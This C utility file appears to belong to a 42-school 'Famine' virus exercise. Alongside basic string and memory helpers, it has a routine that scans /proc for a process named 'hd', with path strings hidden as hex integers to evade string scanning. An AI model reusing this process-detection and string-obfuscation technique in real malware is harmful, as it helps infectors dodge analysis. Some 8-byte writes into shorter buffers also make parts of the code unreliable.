/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   utils.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/10/31 13:23:11 by nguiard           #+#    #+#             */
/*   Updated: 2024/11/25 12:35:46 by nguiard          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

size_t	ft_strlen(str buff) {
	size_t	index = 0;

	while (buff[index])
		index++;

	return index;
}

//	Returns false if the two chuncks are not the same
bool	ft_memcmp(const byte *a, const byte *b, size_t size) {
	size_t	i = 0;

	while (i < size) {
		if (a[i] != b[i])
			return false;
		i++;
	}

	return true;
}

void	ft_memcpy(byte *dest, const byte *src, size_t size) {
	for (size_t i = 0; i < size; i++)
		dest[i] = src[i];
}

bool is_process_running() {
    int64_t ret = 0;
    int64_t ret2 = 0;
    int64_t fd;
    byte buff[BUFF_SIZE];
    dirent *d;
    int64_t d_offset;

    char comm_path[24];

    // "/proc/" en hexadécimal -> 0x2f636f72702f
    uint64_t proc_path = 0x2f636f72702f;
    char path[6];
    *(uint64_t *)path = proc_path;

    // Ouvrir /proc
    open(fd, path, O_RDONLY);
    if (fd < 0)
        return false;

    // Lire les répertoires de /proc
    do {
        getdents(ret, fd, buff, BUFF_SIZE);
        if (ret < 0)
            return false;

        d_offset = 0;

        // Parcourir les entrées dans le répertoire
        while (d_offset < ret) {
            d = (dirent *)((uint64_t)(buff) + d_offset);

            // Vérifier si c'est un dossier numérique (un processus)
            if (d->d_name[0] >= '0' && d->d_name[0] <= '9') {
                // Construire "/proc/[PID]/comm"
                for (int i = 0; i < 6; i++)
                    comm_path[i] = path[i]; // Copie "/proc/"

                int pid_len = ft_strlen(d->d_name);
                for (int i = 0; i < pid_len; i++)
                    comm_path[6 + i] = d->d_name[i]; // Ajoute le PID

                // Ajouter "/comm" en hexadécimal (0x6d6d6f632f)
                *(uint64_t *)(comm_path + 6 + pid_len) = 0x6d6d6f632f;
                comm_path[6 + pid_len + 5] = 0; // Fin de chaîne

                // Ouvrir le fichier /proc/[PID]/comm
                int64_t fd_comm;
                open(fd_comm, comm_path, O_RDONLY);
                if (fd_comm >= 0) {
                    char proc_name[16] = {0}; // Stocke le nom du processus
                    read(ret2, fd_comm, proc_name, 15); // Lire le nom
                    close(fd_comm);

                    // Vérifier si le nom du processus est "hd" en hexadécimal
                    if (*(uint64_t *)proc_name == 0x0a6468) { // "hd"
                        close(fd);
                        return true; // "hd" trouvé
                    }
                }
            }
            d_offset += d->d_reclen;
        }
    } while (ret > 0); // Continuer tant qu'il y a des répertoires à lire

    close(fd);
    return false; // Si le processus "hd" n'a pas été trouvé
}
